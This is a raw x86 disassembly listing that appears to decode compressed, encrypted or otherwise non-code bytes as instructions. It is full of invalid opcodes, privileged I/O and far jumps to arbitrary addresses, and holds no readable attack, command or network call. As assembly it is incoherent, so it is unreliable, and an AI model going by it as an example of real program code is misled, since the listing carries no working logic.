  4120b2:	bound  edx,QWORD PTR [esi-0x132fc50c]
  4120b8:	hlt    
  4120b9:	ins    BYTE PTR es:[edi],dx
  4120ba:	inc    edi
  4120bb:	sub    esi,DWORD PTR [edi+0xb]
  4120be:	fiadd  DWORD PTR [eax]
  4120c0:	fdivr  DWORD PTR [ebx-0x36]
  4120c3:	xadd   esi,ebp
  4120c6:	dec    edx
  4120c7:	or     DWORD PTR [ebx+0xdc58f11],ecx
  4120cd:	xchg   esp,eax
  4120ce:	xchg   esi,eax
  4120cf:	xchg   esp,eax
  4120d0:	sar    BYTE PTR [edi-0x351eb35e],1
  4120d6:	mov    bl,0x5
  4120d8:	lods   al,BYTE PTR ds:[esi]
  4120d9:	adc    DWORD PTR [ebx],ebx
  4120db:	outs   dx,BYTE PTR ds:[esi]
  4120dc:	stos   DWORD PTR es:[edi],eax
  4120dd:	or     edi,edx
  4120df:	xchg   esi,eax
  4120e0:	jo     0x4120ea
  4120e2:	pop    eax
  4120e3:	fbstp  TBYTE PTR [edi-0x55]
  4120e6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4120e7:	inc    esi
  4120e8:	adc    esp,DWORD PTR [ebp-0x65]
  4120eb:	xor    DWORD PTR [ebx+0x3af07bc6],ecx
  4120f1:	loopne 0x4120d1
  4120f3:	ds cmp al,0xaf
  4120f6:	pop    edx
  4120f7:	fst    QWORD PTR [eax]
  4120f9:	daa    
  4120fa:	dec    esp
  4120fb:	sub    DWORD PTR [ebp+0x404d4dee],ebp
  412101:	fild   WORD PTR [ebx-0x48]
  412104:	adc    ebx,DWORD PTR [esi+ecx*2-0x12]
  412108:	cmp    edi,DWORD PTR [eax+0x4fc108dc]
  41210e:	(bad)  ds:0x410d037d
  412114:	pop    esp
  412115:	mov    ss:0x9e5005e9,al
  41211b:	and    edi,ebx
  41211d:	mov    eax,0xeb103b65
  412122:	test   al,0x2b
  412124:	pushf  
  412125:	dec    ebx
  412126:	and    al,0x91
  412128:	xor    edx,DWORD PTR [eax+0x56cb6dcd]
  41212e:	or     esi,DWORD PTR [edx+eiz*8+0x39]
  412132:	push   ds
  412133:	cs xor eax,0x79a8442f
  412139:	push   0x9e9daf33
  41213e:	xchg   ebx,eax
  41213f:	adc    eax,0xe86d5379
  412144:	push   edi
  412145:	shr    DWORD PTR [ebx+0x29],1
  412148:	scas   eax,DWORD PTR es:[edi]
  412149:	mov    dh,0x8b
  41214b:	(bad)  
  41214c:	jnp    0x412166
  41214e:	retf   
  41214f:	or     eax,0xfdef7731
  412154:	pop    edi
  412155:	(bad)  [ebx-0x24]
  412158:	sub    DWORD PTR [ebx],ecx
  41215a:	(bad)  
  41215b:	mov    esi,0xd16e340b
  412160:	cmp    esp,DWORD PTR [edx]
  412162:	or     ecx,ebp
  412164:	and    DWORD PTR [esi+0x6e374d74],edx
  41216a:	xor    eax,0xb1a8d08e
  41216f:	pop    es
  412170:	cmc    
  412171:	jl     0x4121a8
  412173:	(bad)  
  412174:	pop    ds
  412175:	fwait
  412176:	adc    bh,ch
  412178:	push   ebx
  412179:	adc    ebp,DWORD PTR [eax-0x3e]
  41217c:	gs ret 
  41217e:	call   0x421b:0xf2f7a4af
  412185:	push   ebx
  412186:	test   al,0xd7
  412188:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412189:	leave  
  41218a:	sub    dh,BYTE PTR [edx]
  41218c:	cli    
  41218d:	bound  ebp,QWORD PTR [ebx]
  41218f:	pusha  
  412190:	pop    es
  412191:	and    dl,dh
  412193:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412194:	mov    eax,ds:0xff1fde57
  412199:	ss es mov bl,0xc7
  41219d:	std    
  41219e:	inc    ebp
  41219f:	push   es
  4121a0:	aad    0xce
  4121a2:	imul   ecx,DWORD PTR ds:0x167ec542,0xffffff90
  4121a9:	adc    eax,0x6f1eebb9
  4121ae:	icebp  
  4121af:	lds    edx,FWORD PTR [ecx+0x2daf5965]
  4121b5:	sub    al,0xf8
  4121b7:	pop    esi
  4121b8:	xchg   ecx,eax
  4121b9:	mov    dl,0x7a
  4121bb:	xchg   ebx,eax
  4121bc:	mov    esi,0x73fdad23
  4121c1:	mov    esp,0xa3e07eed
  4121c6:	xchg   esi,eax
  4121c7:	cdq    
  4121c8:	out    dx,eax
  4121c9:	or     al,0x37
  4121cb:	ficom  DWORD PTR [ecx]
  4121cd:	xchg   edi,eax
  4121ce:	int3   
  4121cf:	mov    gs,WORD PTR [ecx+edi*4-0x38]
  4121d3:	or     DWORD PTR [esi-0x7bb533dc],esi
  4121d9:	shl    bh,cl
  4121db:	call   0xd31c:0xe05e0712
  4121e2:	sub    al,0x82
  4121e4:	xchg   DWORD PTR [ecx+edx*1+0x2d2387b],edx
  4121eb:	clc    
  4121ec:	mov    edx,0xb92428ae
  4121f1:	mov    esi,0x67472166
  4121f6:	retf   0x72ec
  4121f9:	and    BYTE PTR [edx-0x6d89307f],bl
  4121ff:	out    0xa4,eax
  412201:	cld    
  412202:	adc    DWORD PTR [esi+0xa],edx
  412205:	jae    0x41218c
  412207:	pusha  
  412208:	xor    BYTE PTR [ecx-0x2ee153f9],bh
  41220e:	mov    dh,0x95
  412210:	add    DWORD PTR [ebx-0x1e114c47],edi
  412216:	mov    cl,0x61
  412218:	mov    ds:0x702225ac,eax
  41221d:	mov    bl,0xf
  41221f:	pop    es
  412220:	aam    0x76
  412222:	cs mov cl,0xc8
  412225:	sar    BYTE PTR ds:0x99289b62,0x7d
  41222c:	inc    esp
  41222d:	aaa    
  41222e:	iret   
  41222f:	jnp    0x41223d
  412231:	lods   eax,DWORD PTR ds:[esi]
  412232:	test   al,0x3e
  412234:	cmp    eax,0xfe182fcb
  412239:	add    DWORD PTR [edi+0x69a87f33],ecx
  41223f:	mov    eax,0xf733fdf8
  412244:	shl    DWORD PTR [edx-0x15],0x97
  412248:	pop    edx
  412249:	mov    ds:0x1d73fce9,al
  41224e:	imul   ebx,DWORD PTR [esi],0xffffffba
  412251:	push   0xcdf7a1c0
  412256:	and    eax,0x6007291d
  41225b:	retf   
  41225c:	and    eax,0xd35b3771
  412261:	sahf   
  412262:	cmp    ch,BYTE PTR [ecx]
  412264:	sahf   
  412265:	mov    edx,DWORD PTR [eax]
  412267:	and    ebp,DWORD PTR [esi+0xf2ee87e]
  41226d:	dec    edi
  41226e:	ret    
  41226f:	lods   eax,DWORD PTR ds:[esi]
  412270:	pop    edx
  412271:	pop    ss
  412272:	push   ebp
  412273:	mov    bl,0x86
  412275:	inc    ebp
  412276:	cdq    
  412277:	xlat   BYTE PTR ds:[ebx]
  412278:	or     BYTE PTR [edx],bh
  41227a:	das    
  41227b:	sbb    esp,esp
  41227d:	div    DWORD PTR ds:0xba8139c4
  412283:	ficom  WORD PTR [ebp+0x2cf0d5aa]
  412289:	dec    ebp
  41228a:	pop    ebp
  41228b:	imul   bx,WORD PTR [edx+0x4d0d1e6f],0x7bc1
  412294:	fcmovu st,st(7)
  412296:	inc    esi
  412297:	(bad)  
  412298:	sbb    edx,DWORD PTR [edx+0x4]
  41229b:	pop    ecx
  41229c:	add    eax,0x476b223c
  4122a1:	stc    
  4122a2:	lock adc DWORD PTR [edx+0x2305a170],esi
  4122a9:	or     dl,BYTE PTR [ecx-0x1a5cb856]
  4122af:	adc    al,0x52
  4122b1:	mov    ebx,0x6b740fe3
  4122b6:	mov    esi,esp
  4122b8:	retf   0x3ac9
  4122bb:	fxch   st(0)
  4122bd:	fnstenv ds:0x90f6a1bf
  4122c3:	icebp  
  4122c4:	in     eax,0x2f
  4122c6:	sbb    eax,0x6e7b92bf
  4122cb:	inc    esp
  4122cc:	loope  0x41228c
  4122ce:	or     al,0x8c
  4122d0:	cmp    DWORD PTR [ebp-0x6aa5b716],esp
  4122d6:	fs mov ebx,0x1987c734
  4122dc:	push   edx
  4122dd:	xchg   edx,eax
  4122de:	inc    ecx
  4122df:	jne    0x412354
  4122e1:	jmp    0x5569:0xd2b180ff
  4122e8:	jo     0x4122de
  4122ea:	xchg   DWORD PTR [ecx],edi
  4122ec:	dec    esp
  4122ed:	or     ah,BYTE PTR [edi+0x44]
  4122f0:	mov    es,WORD PTR [ecx+0x2cff38b8]
  4122f6:	and    dl,dh
  4122f8:	mov    bh,0x20
  4122fa:	adc    BYTE PTR [ecx+0x6b],0x36
  4122fe:	dec    esi
  4122ff:	arpl   WORD PTR [ebx+0x2f],bp
  412302:	sbb    BYTE PTR [esi+0x26],0x22
  412306:	cwde   
  412307:	aaa    
  412308:	inc    esp
  412309:	stc    
  41230a:	gs inc esp
  41230c:	sti    
  41230d:	push   ss
  41230e:	mov    ebx,0x2af2112f
  412313:	icebp  
  412314:	pop    es
  412315:	adc    eax,0x221e69dd
  41231a:	outs   dx,BYTE PTR ds:[esi]
  41231b:	xchg   edx,eax
  41231c:	push   ebp
  41231d:	lds    edi,FWORD PTR [esi]
  41231f:	dec    esp
  412320:	das    
  412321:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412322:	mov    esp,0x60af7426
  412327:	into   
  412328:	inc    ecx
  412329:	iret   
  41232a:	sub    al,0xf5
  41232c:	test   DWORD PTR [ecx+0x6f9c6a98],ebx
  412332:	ja     0x4122ff
  412334:	and    ebx,0xc9e46450
  41233a:	mov    ebx,0x2af45d91
  41233f:	pop    esi
  412340:	sub    eax,0x2cf85e08
  412345:	adc    edx,DWORD PTR [edi+0xe]
  412348:	je     0x41233a
  41234a:	pop    eax
  41234b:	sti    
  41234c:	pusha  
  41234d:	pop    esp
  41234e:	jecxz  0x4122d5
  412350:	enter  0xf4b4,0xab
  412354:	pop    ds
  412355:	fimul  DWORD PTR [edx+0x1f]
  412358:	outs   dx,BYTE PTR ds:[esi]
  412359:	jns    0x4122ff
  41235b:	xor    eax,0x325e7cec
  412360:	sbb    BYTE PTR ds:0x52f994cc,cl
  412366:	jg     0x412313
  412368:	cmp    cl,BYTE PTR ss:[edi]
  41236b:	stos   BYTE PTR es:[edi],al
  41236c:	sbb    al,0x30
  41236e:	pusha  
  41236f:	jb     0x41232b
  412371:	push   ss
  412372:	into   
  412373:	ret    
  412374:	(bad)  
  412375:	mov    ds:0x91921086,eax
  41237a:	mov    ds:0x30cf04f1,al
  41237f:	add    BYTE PTR [edi],al
  412381:	mov    dh,0x8e
  412383:	ins    DWORD PTR es:[edi],dx
  412384:	scas   al,BYTE PTR es:[edi]
  412385:	mov    eax,ds:0xdea8f80e
  41238a:	and    ch,BYTE PTR [ebx+0x7c451ecf]
  412390:	loope  0x41236c
  412392:	test   BYTE PTR [esp+eiz*8+0x16],0x32
  412397:	pop    ecx
  412398:	cmp    BYTE PTR [ecx-0x68],dl
  41239b:	inc    ebp
  41239c:	addr16 popa 
  41239e:	aam    0xbc
  4123a0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4123a1:	lahf   
  4123a2:	scas   al,BYTE PTR es:[edi]
  4123a3:	sbb    bl,BYTE PTR [ebp+0x27720a]
  4123a9:	outs   dx,BYTE PTR ds:[esi]
  4123aa:	pop    eax
  4123ab:	mov    al,0xec
  4123ad:	(bad)  
  4123ae:	shr    DWORD PTR [ecx],1
  4123b0:	mov    al,0xa2
  4123b2:	out    0x95,al
  4123b4:	sti    
  4123b5:	mov    dl,0xcd
  4123b7:	cld    
  4123b8:	mov    ah,0x51
  4123ba:	xchg   edi,eax
  4123bb:	sub    bh,ah
  4123bd:	pop    esi
  4123be:	sbb    ah,BYTE PTR [edi+0x1b5ce964]
  4123c4:	jo     0x4123b6
  4123c6:	ins    BYTE PTR es:[edi],dx
  4123c7:	ret    0xbac9
  4123ca:	jnp    0x4123f1
  4123cc:	cmp    DWORD PTR [ecx+0x56],esp
  4123cf:	loope  0x4123b2
  4123d1:	jo     0x4123fd
  4123d3:	pop    eax
  4123d4:	scas   al,BYTE PTR es:[edi]
  4123d5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4123d6:	loopne 0x41241c
  4123d8:	sar    BYTE PTR [ecx],cl
  4123da:	mov    cl,0xb3
  4123dc:	(bad)  
  4123de:	pop    ebp
  4123df:	enter  0x431e,0xf8
  4123e3:	psllq  mm2,mm6
  4123e6:	and    BYTE PTR [edx],cl
  4123e8:	ficom  WORD PTR [edi]
  4123ea:	js     0x4123eb
  4123ec:	xlat   BYTE PTR ds:[ebx]
  4123ed:	jno    0x4123e0
  4123ef:	nop
  4123f0:	cdq    
  4123f1:	jmp    0x17bd:0x52475fb3
  4123f8:	or     esi,eax
  4123fa:	call   0x71b4b49c
  4123ff:	enter  0xdfd0,0xa
  412403:	fcomp  st(4)
  412405:	jmp    0xb552:0xbe0438a5
  41240c:	push   0xc4f68dff
  412411:	std    
  412412:	lock nop
  412414:	(bad)  
  412415:	push   edi
  412416:	repz int3 
  412418:	cld    
  412419:	dec    ebp
  41241a:	call   0x947739f4
  41241f:	jle    0x412480
  412421:	retf   0x98b0
  412424:	lods   al,BYTE PTR ds:[esi]
  412425:	int    0xa4
  412427:	aas    
  412428:	fdiv   DWORD PTR [ecx+0x7d]
  41242b:	mov    BYTE PTR [ebx],0xcb
  41242e:	dec    edx
  41242f:	add    eax,DWORD PTR [ebx+0x76d88739]
  412435:	test   eax,0xe977eb44
  41243a:	(bad)
  41243e:	popa   
  41243f:	pop    ss
  412440:	or     al,0x7c
  412442:	ins    BYTE PTR es:[edi],dx
  412443:	mov    cl,0xb1
  412445:	xchg   esi,eax
  412446:	xchg   ebp,eax
  412447:	mov    ecx,0x22a62cf2
  41244c:	std    
  41244d:	sub    BYTE PTR [edi-0x63],bl
  412450:	ds push esp
  412452:	lea    eax,[edx]
  412454:	xchg   edi,eax
  412455:	sti    
  412456:	inc    edi
  412457:	and    cl,dl
  412459:	pop    ebx
  41245a:	jae    0x4124a3
  41245c:	clc    
  41245d:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  41245f:	jmp    ebx
  412461:	fs push esi
  412463:	mov    al,ds:0xe72f35b7
  412468:	add    eax,0x9cf47481
  41246d:	cmp    eax,eax
  41246f:	cmp    bh,BYTE PTR [ecx+ebp*4]
  412472:	and    DWORD PTR [ebx-0x2929d41c],esp
  412478:	hlt    
  412479:	sahf   
  41247a:	sar    DWORD PTR [ebp-0x5f],1
  41247d:	adc    al,0x97
  41247f:	fdiv   QWORD PTR [ebx*4+0x42901929]
  412486:	pop    edi
  412487:	jne    0x412444
  412489:	add    DWORD PTR [edi+eiz*2+0x8cbeb79],0xccb4acab
  412494:	inc    ecx
  412495:	pop    ds
  412496:	dec    edi
  412497:	jmp    0x412457
  412499:	dec    esp
  41249a:	shr    dh,0xad
  41249d:	inc    edi
  41249e:	jmp    0x41244e
  4124a0:	add    eax,0xcb9bdba
  4124a5:	retf   0x82be
  4124a8:	inc    esp
  4124a9:	in     eax,dx
  4124aa:	fstp   QWORD PTR [ecx+0x79]
  4124ad:	inc    eax
  4124ae:	cmp    ecx,esi
  4124b0:	xchg   DWORD PTR [ecx+0x31],esi
  4124b3:	sar    al,cl
  4124b5:	jl     0x412522
  4124b7:	jmp    0xbfa:0x40698e8e
  4124be:	call   0x3400546d
  4124c3:	or     BYTE PTR [ecx+0x49b6166f],0xf1
  4124ca:	or     DWORD PTR [ebx+0x20],edx
  4124cd:	mov    dl,0x2b
  4124cf:	fwait
  4124d0:	pop    es
  4124d1:	ret    0xd94c
  4124d4:	dec    esp
  4124d5:	mov    al,ds:0x213948aa
  4124da:	in     eax,0x7a
  4124dc:	mov    cl,0xcb
  4124de:	mov    ds:0xb31c7d5,eax
  4124e3:	fsub   st,st(0)
  4124e5:	cmp    bh,BYTE PTR fs:[ecx+ecx*8]
  4124e9:	jae    0x412513
  4124eb:	mov    ch,0x18
  4124ed:	(bad)  
  4124ee:	imul   edx,DWORD PTR [eax],0x5ac87940
  4124f4:	(bad)  
  4124f5:	dec    ebx
  4124f6:	inc    eax
  4124f7:	push   ss
  4124f8:	sub    cl,BYTE PTR [esi]
  4124fa:	sbb    ch,dl
  4124fc:	mov    BYTE PTR [esi-0xe],ah
  4124ff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412500:	or     eax,0x28d92a2c
  412505:	pop    esi
  412506:	cmc    
  412507:	ds mov bh,0xdd
  41250a:	jo     0x412523
  41250c:	stos   BYTE PTR es:[edi],al
  41250d:	das    
  41250e:	mov    WORD PTR [edi],gs
  412510:	add    esp,DWORD PTR [edi-0x59]
  412513:	sub    BYTE PTR [eax],cl
  412515:	imul   ecx,DWORD PTR [eax+0x3a],0x6c
  412519:	mov    bl,0x84
  41251b:	cdq    
  41251c:	mov    ebp,0xb94f28fb
  412521:	call   0x989e:0x1b7359f9
  412528:	or     ecx,DWORD PTR [ebx]
  41252a:	retf   
  41252b:	inc    ebp
  41252c:	sub    eax,0xa5b328b
  412531:	arpl   bx,sp
  412533:	imul   ebx,esp,0x1d4fa14d
  412539:	sar    eax,1
  41253b:	sti    
  41253c:	cwde   
  41253d:	mov    dl,0xb5
  41253f:	xchg   edx,eax
  412540:	(bad)  
  412542:	mov    dl,0x28
  412544:	cmp    eax,0xbddb3dc
  412549:	add    esi,ecx
  41254b:	cmp    ah,BYTE PTR [ebx-0x6d]
  41254e:	cs mov ch,0x40
  412551:	push   cs
  412552:	pop    ss
  412553:	fnstcw WORD PTR [edx-0x4a]
  412556:	fs cmp eax,0x31351fce
  41255d:	or     al,0xa7
  41255f:	mov    WORD PTR [ebx+0x12],?
  412562:	sbb    eax,0xaeb875c5
  412567:	int    0x1
  412569:	sub    edi,DWORD PTR [ebx-0x18]
  41256c:	and    dl,BYTE PTR [eax]
  41256e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41256f:	dec    ebx
  412570:	in     eax,0xce
  412572:	cmp    eax,0x7be62e73
  412577:	outs   dx,DWORD PTR ds:[esi]
  412578:	inc    ebp
  412579:	add    ch,dh
  41257b:	cld    
  41257c:	or     DWORD PTR [esi],ebx
  41257e:	out    dx,eax
  41257f:	push   ebp
  412580:	jp     0x4125e4
  412582:	out    0xb3,al
  412584:	arpl   WORD PTR [edx],sp
  412586:	mov    ecx,0xd50a8259
  41258b:	ins    DWORD PTR es:[edi],dx
  41258c:	sbb    BYTE PTR [ecx],bl
  41258e:	test   BYTE PTR [ebx+0x48089cd3],ah
  412594:	jno    0x412525
  412596:	aad    0x37
  412598:	ret    
  412599:	xchg   esp,eax
  41259a:	adc    eax,0x1e97a4a0
  41259f:	pop    esp
  4125a0:	std    
  4125a1:	inc    eax
  4125a2:	sbb    al,0xf2
  4125a4:	in     eax,0xe6
  4125a6:	icebp  
  4125a7:	adc    eax,0x816035b
  4125ac:	sbb    BYTE PTR [ebx+0x66832e57],bh
  4125b2:	jo     0x412602
  4125b4:	and    eax,0x670581ce
  4125b9:	mov    ?,WORD PTR [edx+0x4d2731f7]
  4125bf:	jno    0x4125d5
  4125c1:	cwde   
  4125c2:	fiadd  DWORD PTR [edx+0x73e66d82]
  4125c8:	test   al,0x5c
  4125ca:	ins    BYTE PTR es:[edi],dx
  4125cb:	cmp    edx,DWORD PTR [edx+0x22]
  4125ce:	out    0x87,al
  4125d0:	lods   al,BYTE PTR ds:[esi]
  4125d1:	daa    
  4125d2:	(bad)  
  4125d3:	jmp    0xccab76d4
  4125d8:	in     eax,dx
  4125d9:	dec    BYTE PTR ds:0xc7856138
  4125df:	in     al,0xd6
  4125e1:	or     edx,esi
  4125e3:	inc    esp
  4125e4:	cmp    eax,0xc729b844
  4125e9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4125ea:	cs inc edi
  4125ec:	imul   ebx,DWORD PTR [edx+0x16],0xffffffcd
  4125f0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4125f1:	mov    ch,0x4f
  4125f3:	jno    0x41258f
  4125f5:	scas   eax,DWORD PTR es:[edi]
  4125f6:	repz mov dh,0xa4
  4125f9:	out    0x77,al
  4125fb:	inc    esp
  4125fc:	mov    DWORD PTR [edi+0x6a],edx
  4125ff:	mov    eax,0xd5c72b03
  412604:	lahf   
  412605:	scas   eax,DWORD PTR es:[edi]
  412606:	jno    0x4125ad
  412608:	pop    eax
  412609:	out    0x36,al
  41260b:	cld    
  41260c:	pop    ss
  41260d:	xchg   ecx,eax
  41260e:	jl     0x4125f4
  412610:	add    al,0x9a
  412612:	imul   ebx,ebx,0xffffffb4
  412615:	test   al,0xb1
  412617:	(bad)
  41261b:	pop    esp
  41261c:	je     0x41266f
  41261e:	ins    BYTE PTR es:[edi],dx
  41261f:	pushf  
  412620:	in     eax,dx
  412621:	or     cl,BYTE PTR [edx+0x9]
  412624:	lock pop ss
  412626:	xor    BYTE PTR [ebx-0x28e2e234],al
  41262c:	dec    edx
  41262d:	jp     0x412681
  41262f:	inc    ebx
  412630:	mov    cl,0x82
  412632:	jmp    0x4125b5
  412634:	mov    ds:0x39394490,al
  412639:	aaa    
  41263a:	mov    ebp,0xb9ae39d5
  41263f:	inc    ebx
  412640:	lock mov edi,ds
  412643:	xchg   ebx,eax
  412644:	jmp    0x412602
  412646:	add    al,0x6d
  412648:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412649:	mov    dl,0xc2
  41264b:	test   cl,0x57
  41264e:	or     eax,DWORD PTR ds:0xaa43d8da
  412654:	sbb    eax,0x91e7ab46
  412659:	mov    ds:0x273e6784,eax
  41265e:	lods   al,BYTE PTR ds:[esi]
  41265f:	pop    ebx
  412660:	mov    esi,0xdf4bf3cf
  412665:	xchg   esi,eax
  412666:	cmp    ch,BYTE PTR [ecx+0x4bfe0f5e]
  41266c:	jp     0x4126dc
  41266e:	cmp    eax,0x7fb29339
  412673:	sar    DWORD PTR [ebx+0x4f3d555f],cl
  412679:	icebp  
  41267a:	push   ecx
  41267b:	push   ds
  41267c:	adc    al,0x7c
  41267e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41267f:	mov    WORD PTR [ebx],es
  412681:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412682:	lock pop edx
  412684:	data16 xor BYTE PTR [edx+0x289c921a],dl
  41268b:	stos   DWORD PTR es:[edi],eax
  41268c:	mov    esi,0x8abf6136
  412691:	sub    DWORD PTR [edi+0x14],0x773f45e0
  412698:	mov    dh,0x63
  41269a:	pop    ss
  41269b:	stc    
  41269c:	pusha  
  41269d:	and    edi,esi
  41269f:	xchg   ebp,eax
  4126a0:	ins    BYTE PTR es:[edi],dx
  4126a1:	enter  0x888,0x9c
  4126a5:	fwait
  4126a6:	je     0x412637
  4126a8:	shl    ah,1
  4126aa:	adc    eax,0x4d45dc40
  4126af:	mov    bl,0x3c
  4126b1:	jecxz  0x412672
  4126b3:	xor    eax,0x4c3ecc8
  4126b8:	mov    ?,edx
  4126ba:	sbb    dh,0x33
  4126bd:	dec    edi
  4126be:	stos   BYTE PTR es:[edi],al
  4126bf:	xchg   esi,eax
  4126c0:	pop    ecx
  4126c1:	test   eax,0x5667c149
  4126c6:	fcom   DWORD PTR [ecx+0x4ff65031]
  4126cc:	jno    0x412723
  4126ce:	scas   eax,DWORD PTR es:[edi]
  4126cf:	pop    esi
  4126d0:	iret   
  4126d1:	cmp    ah,bh
  4126d3:	lods   al,BYTE PTR ds:[esi]
  4126d4:	imul   ecx,DWORD PTR [edi+0x52],0xffffffff
  4126d8:	inc    eax
  4126d9:	sbb    dl,cl
  4126db:	xchg   BYTE PTR [ebx+ebx*8-0x6e00c9e8],bh
  4126e2:	out    dx,al
  4126e3:	out    dx,eax
  4126e4:	mov    ch,0xb
  4126e6:	jmp    0x5fa0:0xaf8ab29c
  4126ed:	pusha  
  4126ee:	mov    eax,ds:0x73b69808
  4126f3:	cdq    
  4126f4:	pusha  
  4126f5:	(bad)  
  4126f6:	lock popf 
  4126f8:	cmp    bh,BYTE PTR [edx-0x44]
  4126fb:	es es rol esp,1
  4126ff:	mov    eax,0xbad5f774
  412704:	adc    esi,DWORD PTR [ebp+eiz*8-0x3f3fcecc]
  41270b:	fs sahf 
  41270d:	and    al,0xa8
  41270f:	mov    ds:0x33c464da,al
  412714:	cdq    
  412715:	and    BYTE PTR [ebx+0x1cc4e11b],ch
  41271b:	ficomp WORD PTR ds:0xee0ecd0c
  412721:	push   ecx
  412722:	cmovs  eax,DWORD PTR [ebx+0x79]
  412726:	mov    ch,0x2c
  412728:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412729:	pop    esp
  41272a:	and    eax,0x5e0e3caa
  41272f:	(bad)  
  412730:	mov    eax,0x93ee80c3
  412735:	aas    
  412736:	ror    DWORD PTR [eax+0x1f112f60],0x5f
  41273d:	cwde   
  41273e:	xchg   edi,eax
  41273f:	or     al,BYTE PTR [ebx+edi*4]
  412742:	and    al,0xb4
  412744:	sbb    ch,BYTE PTR [esi-0x478fa9ec]
  41274a:	ret    0x921c
  41274d:	cmc    
  41274e:	lds    esp,FWORD PTR [esi]
  412750:	cmp    DWORD PTR [ecx-0x11],ecx
  412753:	enter  0xb40e,0x35
  412757:	push   edx
  412758:	pushw  cs
  41275a:	inc    edi
  41275b:	fst    DWORD PTR [esi]
  41275d:	lds    edx,FWORD PTR [esi]
  41275f:	clc    
  412760:	mov    eax,0xfdec0472
  412765:	sti    
  412766:	loop   0x412761
  412768:	mov    BYTE PTR [edi],ch
  41276a:	dec    edx
  41276b:	inc    ebx
  41276c:	adc    edx,edx
  41276e:	shl    ah,0x6b
  412771:	ret    
  412772:	int3   
  412773:	icebp  
  412774:	sub    DWORD PTR [eax-0x6843d496],ecx
  41277a:	dec    ecx
  41277b:	dec    eax
  41277c:	pushf  
  41277d:	addps  xmm6,XMMWORD PTR [edx]
  412780:	neg    BYTE PTR [esi-0x30f504d2]
  412786:	pop    edx
  412787:	jno    0x41278a
  412789:	cmp    BYTE PTR [eax-0x1b],0x31
  41278d:	gs push cs
  41278f:	scas   al,BYTE PTR es:[edi]
  412790:	jae    0x4127cc
  412792:	popa   
  412793:	data16 xor BYTE PTR [eax],cl
  412796:	sbb    esi,DWORD PTR [eax-0x683c4fc]
  41279c:	mov    BYTE PTR [edi+0x23],bl
  41279f:	sar    DWORD PTR [eax+0x16],1
  4127a2:	cli    
  4127a3:	push   edi
  4127a4:	in     al,dx
  4127a5:	or     DWORD PTR [edx],ebx
  4127a7:	data16 (bad) 
  4127aa:	add    eax,0xc5876472
  4127af:	dec    eax
  4127b0:	mov    al,0xca
  4127b2:	mov    BYTE PTR [ebx-0x3a055f7d],0x39
  4127b9:	call   0x57e8:0x5d5eb033
  4127c0:	xchg   esp,eax
  4127c1:	call   0xcf0caeae
  4127c6:	stos   BYTE PTR es:[edi],al
  4127c7:	js     0x412832
  4127c9:	clc    
  4127ca:	mov    ds:0x678dcdf4,al
  4127cf:	mov    edx,0xddb93e83
  4127d4:	in     al,dx
  4127d5:	les    esp,FWORD PTR [eax-0x53d2ff6b]
  4127db:	ror    BYTE PTR [edi],0x80
  4127de:	aaa    
  4127df:	enter  0x513f,0xaf
  4127e3:	(bad)  
  4127e4:	adc    ch,bh
  4127e6:	xchg   edi,eax
  4127e7:	sbb    edx,DWORD PTR [edx]
  4127e9:	inc    esi
  4127ea:	xchg   DWORD PTR [edx+0x27d6d907],ebx
  4127f0:	sbb    DWORD PTR [ebx+ebp*8-0x5a],ebx
  4127f4:	mov    dl,BYTE PTR [edi-0x32b9313]
  4127fa:	jp     0x41278a
  4127fc:	iret   
  4127fd:	into   
  4127fe:	mov    ds:0xb6a1875c,al
  412803:	pop    es
  412804:	xlat   BYTE PTR ds:[ebx]
  412805:	popa   
  412806:	jne    0x412883
  412808:	mov    ds:0xa4beb58d,al
  41280d:	mov    ecx,DWORD PTR [ecx+eiz*8+0x5524d8fe]
  412814:	mov    bh,0x77
  412816:	push   0x144e2c96
  41281b:	ror    DWORD PTR [ebx+0x37],0xee
  41281f:	(bad)  
  412820:	enter  0x8ad1,0x11
  412824:	(bad)  
  412826:	sub    al,BYTE PTR [esp+edi*2]
  412829:	std    
  41282a:	inc    esi
  41282b:	jns    0x412803
  41282d:	or     ch,cl
  41282f:	jnp    0x412867
  412831:	push   esi
  412832:	clc    
  412833:	cmp    ch,BYTE PTR [ebx-0x13bf59d2]
  412839:	dec    edx
  41283a:	xor    esi,DWORD PTR [edx+edx*2-0x4868c205]
  412841:	(bad)  
  412842:	in     al,0x36
  412844:	or     ecx,DWORD PTR ds:0x1d2de4a9
  41284a:	int    0x6a
  41284c:	ret    
  41284d:	lahf   
  41284e:	daa    
  41284f:	mov    esi,0x37a31e96
  412854:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412855:	scas   al,BYTE PTR es:[edi]
  412856:	addr16 in al,dx
  412858:	mov    edi,DWORD PTR [esp+esi*4-0x2fb90bea]
  41285f:	cmp    ch,BYTE PTR [ebx]
  412861:	loopne 0x41282c
  412863:	or     DWORD PTR [ebx-0x3f],eax
  412866:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412867:	fwait
  412868:	push   esp
  412869:	fsubrp st(5),st
  41286b:	inc    eax
  41286c:	pop    edi
  41286d:	push   ds
  41286e:	test   eax,0xff8ae5bb
  412873:	test   eax,0x7ec6b612
  412878:	xchg   esi,eax
  412879:	mov    BYTE PTR [esi],0xcc
  41287c:	inc    edx
  41287d:	push   ebx
  41287e:	es stos DWORD PTR es:[edi],eax
  412880:	xor    al,0x46
  412882:	mov    edx,0x89d29392
  412887:	retf   
  412888:	mov    al,ds:0x4c05e688
  41288d:	fwait
  41288e:	inc    ecx
  41288f:	stc    
  412890:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412891:	push   ecx
  412892:	daa    
  412893:	fs xchg esp,eax
